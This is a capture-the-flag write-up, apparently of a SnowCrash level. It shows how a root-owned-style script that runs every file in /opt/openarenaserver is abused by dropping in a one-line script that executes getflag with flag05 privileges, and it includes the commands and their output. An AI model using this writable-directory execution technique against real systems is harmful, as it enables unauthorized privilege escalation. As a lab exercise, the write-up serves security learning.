# LEVEL05

## Analysis

Enumerating files in the home directory did not provide useful information but a search for files owned by `flag05` reveals:
```bash
        $ find / -user flag05 2>/dev/null
```
Output:
```txt
        /usr/sbin/openarenaserver
        /rofs/usr/sbin/openarenaserver
```

## Investigation

The first file is interesting since we can read and execute it:
```bash
        $ ls -la /usr/sbin/openarenaserver
        -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
        $ cat /usr/sbin/openarenaserver
        #!/bin/sh

        for i in /opt/openarenaserver/* ; do
                (ulimit -t 5; bash -x "$i")
                rm -f "$i"
        done
```

This script executes every file in `/opt/openarenaserver` directory using `bash -x "$i"` and then deletes it. Any file placed in this directory is executed automatically.

## Vulnerability

If a user can write into this directory, they can introduce arbitrary shell scripts that will be executed with flag05 privileges. This vulnerability consists on unsafe execution of user-controlled files in a privileged context.

## Exploitation

We place a malicious file in `/opt/openarenaserver/`.
```bash
        $ echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
        $ cat /tmp/flag
        cat: /tmp/flag: No such file or directory
        $ cat /tmp/flag
        cat: /tmp/flag: No such file or directory
        $ cat /tmp/flag
        cat: /tmp/flag: No such file or directory
        $ cat /tmp/flag
        Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Takeaways

- Executing files from writable directories introduces severe security risks
- bash -x executes scripts in a trace/debug mode but still runs commands fully